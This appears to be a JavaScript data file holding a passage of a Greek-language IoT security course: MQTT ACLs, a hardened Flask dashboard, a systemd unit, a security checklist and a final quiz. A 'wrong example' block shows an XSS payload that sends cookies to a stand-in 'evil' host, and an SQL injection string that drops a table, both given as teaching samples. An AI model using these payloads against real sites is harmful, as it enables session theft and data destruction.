            '- **LWT** `offline` retained και `online` retained μετά τη σύνδεση.',
            '- **DHT22**: απορρίπτουμε `NaN` και τιμές εκτός φυσικών ορίων του αισθητήρα. Ο DHT22 θέλει τουλάχιστον 2s ανάμεσα σε μετρήσεις (εδώ: ≥10s).',
            '- **Heartbeat** κάθε 60s, στην ίδια μορφή που περιμένει το `monitor.py` (Εν. 8.3), με `reset` ως κείμενο (`panic`, `watchdog`…).',
            '- **Backoff** έως 60s, **watchdog** 30s, και κανένα μυστικό στο Serial.',
            '- `designated initializers` (`.timeout_ms = …`) στη σειρά των πεδίων: υποστηρίζονται από τον compiler του Arduino core 3.x.'
          )),
          warn('Πριν το βάλεις στον τοίχο: Core Debug Level **None**, OTA **κλειστό** (ή με κωδικό και παράθυρο), και αν η συσκευή θα είναι σε χώρο όπου έχουν πρόσβαση άλλοι, σκέψου σοβαρά **Secure Boot + Flash Encryption** (Εν. 5), με build από ESP-IDF/PlatformIO.'),
          quiz('Ο επιτιθέμενος στέλνει `interval=1` στο `home/sensor01/cmd`. Τι γίνεται;',
            ['Η συσκευή στέλνει κάθε 1s και γεμίζει τον broker', 'Απορρίπτεται: δεκτές μόνο τιμές 10–3600. Και αν δεν έχει δικαίωμα write στο cmd από την ACL, δεν φτάνει καν', 'Η συσκευή κρασάρει', 'Αλλάζει το Wi‑Fi'], 1,
            'Δύο επίπεδα: η **ACL** στον broker (ποιος γράφει στο `cmd`) και ο **έλεγχος ορίων** στη συσκευή.'),
          quiz('Γιατί τα topics φτιάχνονται από το `MQTT_USER`;',
            ['Για ομορφιά', 'Για να ταιριάζουν με μία γενική ACL `pattern … home/%u/…`, ώστε κάθε συσκευή να γράφει μόνο στα δικά της topics', 'Γιατί το απαιτεί το TLS', 'Για να είναι πιο σύντομα'], 1,
            'Έτσι μία γραμμή ACL καλύπτει **όλους** τους αισθητήρες, και κανένας δεν μπορεί να «μιμηθεί» άλλον.'),
        ],
      },
      {
        id: 'iot-9-2', title: 'Broker και ασφαλές dashboard στο Pi', minutes: 25,
        goal: 'Να ολοκληρώσεις το Pi: τελικές ACL, ένα **dashboard** σε Python (paho → SQLite → Flask) χωρίς XSS και SQL injection, ως **systemd service με hardening**, προσβάσιμο μόνο μέσω SSH tunnel.',
        blocks: [
          code('text', '/etc/mosquitto/acl (τελική)', R`
# Όλοι οι αισθητήρες: μόνο τα δικά τους topics
pattern write home/%u/state
pattern write home/%u/status
pattern write home/%u/heartbeat
pattern read  home/%u/cmd

user dashboard
topic read home/+/state
topic read home/+/status

user monitor
topic read  home/#
topic write alerts/#

# Εσύ, από το laptop, για εντολές
user maria
topic readwrite home/#
topic read alerts/#
`, L(
            '- Τα `pattern` ισχύουν για όλους: κάθε `sensorXX` γράφει μόνο κάτω από `home/sensorXX/`.',
            '- Ο `dashboard` **μόνο διαβάζει**. Αν παραβιαστεί το dashboard, δεν μπορεί να στείλει εντολές.',
            '- Μόνο ο `maria` (εσύ) γράφει σε `cmd`. Κανένας αισθητήρας δεν στέλνει εντολές σε άλλον.',
            '- Θυμήσου: `sudo systemctl reload mosquitto` μετά από αλλαγή.'
          )),
          text(
            '### Το dashboard: δύο κλασικά λάθη',
            'Τα δεδομένα στο dashboard έρχονται από συσκευές, άρα **δεν είναι έμπιστα**. Αν μια συσκευή παραβιαστεί, θα στείλει ό,τι θέλει.'
          ),
          code('python', '❌ XSS και SQL injection', R`
# ❌ SQL injection: το device έρχεται από το topic (δηλαδή από το δίκτυο)
con.execute(f"INSERT INTO readings VALUES ({time.time()}, '{device}', {t}, {h})")

# ❌ XSS: HTML με f-string. Αν η συσκευή στείλει όνομα/τιμή όπως
#    <script>fetch('//evil/'+document.cookie)</script>  → εκτελείται στον browser σου
html = f"<tr><td>{device}</td><td>{t}</td></tr>"
`, L(
            '- **SQL injection:** ένα όνομα συσκευής όπως `x\', 0, 0); DROP TABLE readings; --` αλλάζει το SQL.',
            '- **XSS:** ό,τι μπαίνει σε HTML χωρίς escaping μπορεί να γίνει κώδικας JavaScript στον δικό σου browser.',
            '- Η λύση και για τα δύο: **ποτέ** δεν φτιάχνεις SQL/HTML με ένωση strings. Παράμετροι για SQL, templates με autoescape για HTML.'
          )),
          code('python', '✅ /opt/iotdash/dashboard.py', R`
#!/usr/bin/env python3
"""IoT dashboard: MQTT/TLS → SQLite → Flask (μόνο 127.0.0.1)."""
import json
import os
import re
import sqlite3
import ssl
import time
import paho.mqtt.client as mqtt
from flask import Flask, render_template_string

DB = os.path.join(os.environ.get("STATE_DIRECTORY", "/var/lib/iotdash"), "data.db")
BROKER, CA = "pi-broker.local", "/etc/mosquitto/certs/ca.crt"
DEVICE_RE = re.compile(r"^[a-z0-9_-]{1,32}$")


def db():
    con = sqlite3.connect(DB, timeout=5)
    con.execute("CREATE TABLE IF NOT EXISTS readings (ts REAL, device TEXT, t REAL, h REAL)")
    return con


def valid(d):
    return (isinstance(d, dict)
            and isinstance(d.get("t"), (int, float)) and -40 <= d["t"] <= 80
            and isinstance(d.get("h"), (int, float)) and 0 <= d["h"] <= 100)


# ---------- MQTT ----------
def on_connect(c, userdata, flags, rc, props):
    if rc.is_failure:
        print("MQTT αποτυχία:", rc)
        return
    c.subscribe("home/+/state", qos=1)


def on_message(c, userdata, msg):
    parts = msg.topic.split("/")
    if len(parts) != 3 or not DEVICE_RE.match(parts[1]) or len(msg.payload) > 256:
        return                                           # απόρριψη ό,τι είναι περίεργο
    try:
        d = json.loads(msg.payload)
    except ValueError:
        return
    if not valid(d):
        return
    con = db()
    with con:                                            # commit αυτόματα
        con.execute("INSERT INTO readings VALUES (?, ?, ?, ?)",   # ✅ παράμετροι
                    (time.time(), parts[1], float(d["t"]), float(d["h"])))
    con.close()


client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id="dashboard")
client.username_pw_set("dashboard", os.environ["MQTT_PASS"])
client.tls_set(ca_certs=CA, cert_reqs=ssl.CERT_REQUIRED)
client.on_connect, client.on_message = on_connect, on_message
client.connect(BROKER, 8883, keepalive=60)
client.loop_start()

# ---------- Web ----------
app = Flask(__name__)
PAGE = """<!doctype html><html lang="el"><meta charset="utf-8">
<meta http-equiv="refresh" content="30"><title>IoT</title>
<style>body{font-family:sans-serif;background:#0b111c;color:#cfe0f5}td,th{padding:6px 12px}</style>
<h1>🌡️ Αισθητήρες</h1>
<table><tr><th>Συσκευή</th><th>°C</th><th>%RH</th><th>Τελευταία μέτρηση</th></tr>
{% for dev, t, h, ts in rows %}
<tr><td>{{ dev }}</td><td>{{ '%.1f' % t }}</td><td>{{ '%.0f' % h }}</td><td>{{ ts }}</td></tr>
{% endfor %}
</table></html>"""


@app.after_request
def headers(resp):
    resp.headers["Content-Security-Policy"] = "default-src 'none'; style-src 'unsafe-inline'"
    resp.headers["X-Content-Type-Options"] = "nosniff"
    resp.headers["X-Frame-Options"] = "DENY"
    return resp


@app.route("/")
def index():
    con = db()
    rows = con.execute(
        "SELECT device, t, h, datetime(MAX(ts), 'unixepoch', 'localtime') "
        "FROM readings GROUP BY device ORDER BY device").fetchall()
    con.close()
    return render_template_string(PAGE, rows=rows)      # ✅ Jinja2 autoescape


if __name__ == "__main__":
    app.run(host="127.0.0.1", port=8080)                 # ✅ ΜΟΝΟ τοπικά
`, L(
            '- `STATE_DIRECTORY`: το systemd δίνει αυτόματα τον φάκελο που ορίζει το `StateDirectory=` (βλ. unit παρακάτω).',
            '- `DEVICE_RE`: το όνομα συσκευής πρέπει να ταιριάζει σε αυστηρό μοτίβο. Ό,τι άλλο απορρίπτεται πριν φτάσει στη βάση.',
            '- `len(msg.payload) > 256`: όριο μεγέθους πριν το `json.loads`.',
            '- `valid()`: τύποι **και** φυσικά όρια. Ένα παραβιασμένο ESP32 δεν μπορεί να γράψει «300°C» στο ιστορικό.',
            '- `VALUES (?, ?, ?, ?)`: **παράμετροι** SQL. Η βάση τις χειρίζεται ως δεδομένα, ποτέ ως κώδικα.',
            '- `render_template_string`: το Jinja2 του Flask κάνει **autoescape** σε `{{ }}`, άρα το `<script>` εμφανίζεται ως κείμενο.',
            '- **Security headers**: το CSP `default-src \'none\'` απαγορεύει κάθε script, ακόμα κι αν κάποτε ξεφύγει ένα XSS.',
            '- `host="127.0.0.1"`: το dashboard δεν είναι προσβάσιμο από το δίκτυο, μόνο μέσω SSH tunnel.'
          )),
          code('bash', 'Εγκατάσταση ως υπηρεσία με δικό της χρήστη', R`
# Χρήστης συστήματος χωρίς shell και χωρίς home
sudo useradd --system --no-create-home --shell /usr/sbin/nologin iotdash

sudo mkdir -p /opt/iotdash
sudo python3 -m venv /opt/iotdash/venv
sudo /opt/iotdash/venv/bin/pip install "paho-mqtt>=2.0" flask
sudo cp dashboard.py /opt/iotdash/

# Ο κωδικός MQTT του dashboard σε αρχείο που διαβάζει μόνο ο root (το systemd τον περνάει)
echo "MQTT_PASS=ο-κωδικός-του-dashboard" | sudo tee /etc/iotdash.env >/dev/null
sudo chmod 600 /etc/iotdash.env
`, L(
            '- `--system --shell /usr/sbin/nologin`: λογαριασμός μόνο για την υπηρεσία. Κανείς δεν κάνει login ως `iotdash`.',
            '- Ο κώδικας στο `/opt/iotdash` ανήκει στον root: η υπηρεσία **δεν** μπορεί να αλλάξει τον εαυτό της.',
            '- `/etc/iotdash.env` με 600: το systemd το διαβάζει ως root και περνά τη μεταβλητή στην υπηρεσία.'
          )),
          code('text', '/etc/systemd/system/iotdash.service', R`
[Unit]
Description=IoT dashboard (MQTT → SQLite → Flask)
After=network-online.target mosquitto.service
Wants=network-online.target

[Service]
User=iotdash
Group=iotdash
EnvironmentFile=/etc/iotdash.env
ExecStart=/opt/iotdash/venv/bin/python /opt/iotdash/dashboard.py
Restart=on-failure
RestartSec=5

# --- Hardening ---
StateDirectory=iotdash
NoNewPrivileges=yes
ProtectSystem=strict
ProtectHome=yes
PrivateTmp=yes
PrivateDevices=yes
ProtectKernelTunables=yes
ProtectKernelModules=yes
ProtectControlGroups=yes
RestrictAddressFamilies=AF_INET AF_INET6 AF_UNIX
CapabilityBoundingSet=
LockPersonality=yes
MemoryDenyWriteExecute=yes

[Install]
WantedBy=multi-user.target
`, L(
            '- `User=iotdash`: χωρίς root.',
            '- `StateDirectory=iotdash`: το systemd φτιάχνει το `/var/lib/iotdash` με owner τον `iotdash` και είναι ο **μόνος** φάκελος όπου μπορεί να γράψει (λόγω `ProtectSystem=strict`).',
            '- `ProtectHome`, `PrivateTmp`, `PrivateDevices`: δεν βλέπει homes, κοινό /tmp, ή συσκευές.',
            '- `CapabilityBoundingSet=` (κενό): καμία ειδική δυνατότητα του kernel.',
            '- `RestrictAddressFamilies`: μόνο IP και Unix sockets (όχι raw/packet sockets).',
            '- Δες πόσο «κλειστή» είναι: `systemd-analyze security iotdash` (χαμηλότερο σκορ = καλύτερα).'
          )),
          code('bash', 'Εκκίνηση και πρόσβαση', R`
sudo systemctl daemon-reload
sudo systemctl enable --now iotdash
systemctl status iotdash --no-pager
systemd-analyze security iotdash | tail -1

# Από το laptop: tunnel και άνοιγμα στο http://127.0.0.1:8080
ssh -N -L 8080:127.0.0.1:8080 maria@pi-broker.local
`, L(
            '- `systemd-analyze security`: βαθμολογία έκθεσης της υπηρεσίας. Σύγκρινε πριν και μετά το hardening.',
            '- Το tunnel είναι η **μόνη** πόρτα προς το dashboard. Χωρίς το SSH κλειδί σου, κανείς δεν το βλέπει.'
          )),
          tip('Θέλεις να το βλέπεις από το κινητό εκτός σπιτιού; **Όχι** port forwarding. Βάλε **WireGuard/Tailscale** στο Pi και στο κινητό, και άνοιξε το tunnel μέσα από το VPN.'),
          quiz('Μια παραβιασμένη συσκευή στέλνει `{"t": 22, "h": 50}` στο topic `home/<script>alert(1)</script>/state`. Τι γίνεται στο dashboard;',
            ['Εκτελείται το script', 'Απορρίπτεται από το `DEVICE_RE`· και αν περνούσε, το autoescape και το CSP θα το εμπόδιζαν. Επιπλέον, η ACL δεν επιτρέπει σε συσκευή να γράψει σε άλλο topic', 'Σβήνεται η βάση', 'Κρασάρει ο broker'], 1,
            'Τρία επίπεδα: ACL στον broker, validation στην είσοδο, escaping/CSP στην έξοδο. Κανένα δεν αρκεί μόνο του, μαζί είναι πολύ δύσκολο να περάσει κάτι.'),
          quiz('Γιατί ο χρήστης MQTT `dashboard` έχει **μόνο** `read`;',
            ['Για ταχύτητα', 'Αρχή ελάχιστων δικαιωμάτων: αν παραβιαστεί το dashboard, δεν μπορεί να στείλει εντολές στις συσκευές', 'Γιατί το Flask δεν γράφει', 'Γιατί το απαιτεί το TLS'], 1,
            'Κάθε κομμάτι παίρνει **μόνο** τα δικαιώματα που χρειάζεται. Έτσι περιορίζεις τη ζημιά όταν κάτι πάει στραβά.'),
        ],
      },
      {
        id: 'iot-9-3', title: 'Security checklist και τελικό τεστ', minutes: 20,
        goal: 'Να ελέγξεις το σύστημά σου με ένα **checklist** που αντιστοιχεί στο OWASP IoT Top 10 και να δοκιμάσεις όσα έμαθες σε **12 ερωτήσεις**.',
        blocks: [
          text(
            'Πέρασε το παρακάτω checklist στο **δικό σου** σύστημα. Κάθε «όχι» είναι μια συγκεκριμένη δουλειά για το επόμενο Σαββατοκύριακο.'
          ),
          table(['✓', 'Έλεγχος', 'Πώς το επιβεβαιώνεις', 'OWASP'], [
            ['☐', 'Κανένας default χρήστης/κωδικός (pi, admin)', '`getent passwd pi`, ρυθμίσεις συσκευών', 'I1'],
            ['☐', 'SSH μόνο με κλειδιά, όχι root', '`sudo sshd -T | grep -Ei \'passwordauth|permitroot\'`', 'I1, I2'],
            ['☐', 'Firewall: deny incoming, μόνο 22 και 8883 από LAN/IoT', '`sudo ufw status verbose` ή `nft list ruleset`', 'I2'],
            ['☐', 'fail2ban ενεργό', '`sudo fail2ban-client status sshd`', 'I2'],
            ['☐', 'Αυτόματες ενημερώσεις', '`unattended-upgrade --dry-run --debug`', 'I4, I5'],
            ['☐', 'Μόνο οι απαραίτητες υπηρεσίες', '`sudo ss -tulpn`', 'I2, I9'],
            ['☐', 'Mosquitto: όχι anonymous, password_file, ACL', '`mosquitto_pub` χωρίς κωδικό → not authorised', 'I3, I9'],
            ['☐', 'MQTT μόνο TLS στο δίκτυο (1883 μόνο localhost)', '`ss -tlnp | grep mosquitto`, `openssl s_client`', 'I7'],
            ['☐', 'ESP32: `setCACert`, **ποτέ** `setInsecure`', '`grep -rn setInsecure` στον κώδικα', 'I7'],
            ['☐', 'Κανένα μυστικό στο Git', '`git log --all -- secrets.h`, `git grep -i pass`', 'I1'],
            ['☐', 'Χρήστης MQTT ανά συσκευή', 'Το `passwd` έχει έναν χρήστη ανά ESP32', 'I1, I8'],
            ['☐', 'Έλεγχος εισόδου σε κάθε callback', 'Όρια μήκους, whitelist εντολών', 'I3'],
            ['☐', 'OTA: κλειστό ή με κωδικό/παράθυρο, ή HTTPS + υπογραφή', 'nmap θύρα 3232', 'I4'],
            ['☐', 'Debug logs off σε παραγωγή', 'Serial monitor: δεν τυπώνει μυστικά', 'I9'],
            ['☐', 'Secure Boot + Flash Encryption (για εκτεθειμένες συσκευές)', '`espefuse.py summary`', 'I10'],
            ['☐', 'JTAG/UART download κλειστά ή secure', '`espefuse.py summary | grep -i jtag`', 'I10'],
            ['☐', 'IoT σε χωριστό δίκτυο, IoT → LAN κλειστό', 'Από ESP32/IoT δοκίμασε σύνδεση στο laptop', 'I2'],
            ['☐', 'UPnP off στον router', '`upnpc -l` χωρίς mappings', 'I9'],
            ['☐', 'Heartbeat + monitor + ειδοποιήσεις', 'Βγάλε ένα ESP32 από την πρίζα → alert σε ~3 λεπτά', 'I8'],
            ['☐', 'Το `ca.key` και το signing key είναι offline με backup', 'Δεν υπάρχουν στο Pi', 'I7, I10'],
          ]),
          nw('pentest', 'Τρέξε τον σαρωτή LAN της καρτέλας **🔴 Pentest** του NetWatch στο δίκτυό σου. Ιδανικά το Pi δείχνει μόνο SSH (22) και MQTT/TLS (8883), και τα ESP32 καμία ανοιχτή θύρα.'),
          tip('Επανέλαβε το checklist **κάθε φορά** που προσθέτεις συσκευή ή αλλάζεις κάτι. Η ασφάλεια δεν είναι κατάσταση, είναι συνήθεια.'),
          text('### Τελικό τεστ'),
          quiz('1. Ποιο ήταν το βασικό «όπλο» του Mirai;',
            ['Zero-day ευπάθεια στο Linux', 'Telnet με εργοστασιακούς κωδικούς', 'Phishing emails', 'Ευπάθεια στο TLS'], 1,
            'Απλά default credentials σε Telnet. Γι’ αυτό το I1 είναι πρώτο στο OWASP IoT Top 10.'),
          quiz('2. Στο `sshd_config` ποιος συνδυασμός κλείνει εντελώς τη σύνδεση με κωδικό;',
            ['`PermitRootLogin no`', '`PasswordAuthentication no` και `KbdInteractiveAuthentication no`', '`MaxAuthTries 3`', '`X11Forwarding no`'], 1,
            'Και οι δύο μέθοδοι κωδικού πρέπει να κλείσουν. Επιβεβαίωσε με `sshd -T`.'),
          quiz('3. Mosquitto 2.x με `listener 8883` και χωρίς καμία ρύθμιση `allow_anonymous`. Δέχεται anonymous clients;',
            ['Ναι', 'Όχι: στη 2.x, όταν ορίζεις listener, το `allow_anonymous` είναι `false` από προεπιλογή', 'Μόνο με TLS', 'Μόνο από localhost'], 1,
            'Το Mosquitto 2.0 άλλαξε τα defaults σε «secure by default». Εμείς το γράφουμε ρητά ούτως ή άλλως.'),
          quiz('4. Τι κάνει το `net.setInsecure()` στο `WiFiClientSecure`;',
            ['Απενεργοποιεί την κρυπτογράφηση', 'Κρυπτογραφεί, αλλά δεν ελέγχει το πιστοποιητικό του server: ανοιχτό σε MITM', 'Κάνει το TLS πιο γρήγορο και ασφαλές', 'Ενεργοποιεί TLS 1.3'], 1,
            'Κρυπτογράφηση χωρίς ταυτοποίηση = μιλάς κρυπτογραφημένα με… όποιον βρεθεί στη μέση.'),
          quiz('5. Ποιο πεδίο του πιστοποιητικού ελέγχουν οι σύγχρονοι clients για το όνομα του server;',
            ['Το CN', 'Το SAN (subjectAltName)', 'Το serial number', 'Την ημερομηνία'], 1,
            'Αν το όνομα ή η IP που δίνεις στο `connect()` δεν είναι στο SAN, η σύνδεση αποτυγχάνει.'),
          quiz('6. Στο callback της PubSubClient, ποιο είναι το σωστό;',
            ['`strcpy(buf, (char*)payload)`', 'Έλεγχος `length < sizeof(buf)`, `memcpy`, και `buf[length] = \'\\0\'`', '`Serial.println((char*)payload)`', '`String s = (char*)payload;`'], 1,
            'Το payload δεν τελειώνει σε `\\0`. Πάντα με βάση το `length` και με όριο.'),
          quiz('7. Τι προστατεύει το Flash Encryption;',
            ['Ποιο firmware τρέχει', 'Την εμπιστευτικότητα των δεδομένων στο flash (κωδικοί, κλειδιά) απέναντι σε dump', 'Την κίνηση Wi‑Fi', 'Το MQTT'], 1,
            'Για το ποιο firmware τρέχει χρειάζεσαι Secure Boot. Τα δύο μαζί.'),
          quiz('8. Γιατί τα eFuses απαιτούν μεγάλη προσοχή;',
            ['Είναι ακριβά', 'Γράφονται μία φορά: λάθος ρύθμιση ή χαμένο κλειδί μπορεί να κάνει το chip μόνιμα άχρηστο', 'Σβήνουν σε κάθε reboot', 'Χρειάζονται Internet'], 1,
            'Δοκιμή σε πλακέτα «για θυσία», backup κλειδιών, Development mode πρώτα.'),
          quiz('9. Ποιο επίπεδο ασφάλειας OTA αποδεικνύει **ποιος** έφτιαξε το firmware;',
            ['Ο κωδικός του ArduinoOTA', 'Το HTTPS', 'Η ψηφιακή υπογραφή του image', 'Το SHA-256 digest'], 2,
            'Μόνο η υπογραφή με κλειδί που κρατάς εσύ αποδεικνύει προέλευση. Το HTTPS προστατεύει τη μεταφορά, το digest την ακεραιότητα.'),
          quiz('10. Με το IoT σε χωριστό δίκτυο και κανόνα IoT → LAN = DROP, τι πετυχαίνεις;',
            ['Οι IoT συσκευές δεν παραβιάζονται ποτέ', 'Μια παραβιασμένη συσκευή δεν μπορεί να επιτεθεί στα υπόλοιπα μηχανήματα του σπιτιού (περιορισμός ζημιάς)', 'Γρηγορότερο Wi‑Fi', 'Δεν χρειάζεται πια TLS'], 1,
            'Το segmentation δεν αποτρέπει την παραβίαση· περιορίζει το **blast radius**.'),
          quiz('11. Το `arp_guard.py` ειδοποιεί: «ARP SPOOF του gateway». Τα ESP32 χρησιμοποιούν MQTT/TLS με δική σου CA. Ποια είναι η σωστή εκτίμηση;',
            ['Ο επιτιθέμενος διαβάζει όλα τα δεδομένα MQTT', 'Το περιεχόμενο MQTT είναι προστατευμένο, αλλά κάποιος στο LAN κάνει MITM: βρες τη συσκευή με τη MAC από την ειδοποίηση και απομόνωσέ την', 'Είναι false positive, το αγνοείς', 'Πρέπει να απενεργοποιήσεις το TLS'], 1,
            'Το TLS κάνει τη δουλειά του, αλλά το ARP spoofing σημαίνει ότι **κάτι** στο δίκτυο είναι εχθρικό. Η ανίχνευση σού λέει να ψάξεις.'),
          quiz('12. Ποιο από τα παρακάτω **δεν** είναι καλή πρακτική για το dashboard;',
            ['Bind σε 127.0.0.1 και πρόσβαση με SSH tunnel', 'SQL με παραμέτρους `?`', 'HTML με f-strings από δεδομένα MQTT', 'Systemd service με δικό του χρήστη και `ProtectSystem=strict`'], 2,
            'HTML με ένωση strings από μη έμπιστα δεδομένα = XSS. Πάντα templates με autoescape.'),
          quiz('13. (Μπόνους) Βρήκες το `ca.key` της CA σου στο `/home/maria/iot-ca` του Pi broker. Τι κάνεις;',
            ['Τίποτα, είναι με κωδικό', 'Το μεταφέρεις σε offline μέσο (με backup) και το σβήνεις με ασφάλεια από το Pi (`shred -u`)', 'Το κάνεις chmod 777', 'Το ανεβάζεις στο Git για backup'], 1,
            'Ακόμα και με κωδικό, δεν θέλεις το πιο πολύτιμο κλειδί σου στο μηχάνημα που είναι πιο εκτεθειμένο. Αν κλαπεί το Pi, ο κλέφτης έχει όλο τον χρόνο να «σπάσει» τον κωδικό.'),
          text(
            '### 🎉 Συγχαρητήρια!',
            'Ξεκίνησες από «τι είναι το IoT» και έφτασες σε σύστημα με hardening, TLS με δική σου CA, ACL, segmentation, monitoring και ασφαλές firmware. Αυτό είναι **καλύτερο** από τις περισσότερες εμπορικές IoT συσκευές.',
            '',
            '**Επόμενα βήματα:**',
            '- **Mutual TLS** (client certificates ανά ESP32) και κατάργηση των κωδικών MQTT.',
            '- **Secure Boot + Flash Encryption** σε release mode σε μια πλακέτα παραγωγής.',
            '- **WireGuard** για απομακρυσμένη πρόσβαση χωρίς ανοιχτές θύρες.',
            '- Δικοί σου κανόνες ανίχνευσης στην καρτέλα **🧩 Κανόνες** του NetWatch για την IoT κίνησή σου.'
          ),
        ],
      },
    ],
  });

  ACADEMY.track({
    id: 'iot',
    order: 2,
    title: '🔌 IoT Security: ESP32 & Raspberry Pi',
    level: 'Αρχάριος → Προχωρημένος',
    desc: 'Ασφάλισε τα δικά σου projects με ESP32 και Raspberry Pi, βήμα-βήμα και με κώδικα που τρέχει: hardening, MQTT με TLS, Secure Boot, segmentation, monitoring και τελικό project.',
    modules: M,
  });
})();
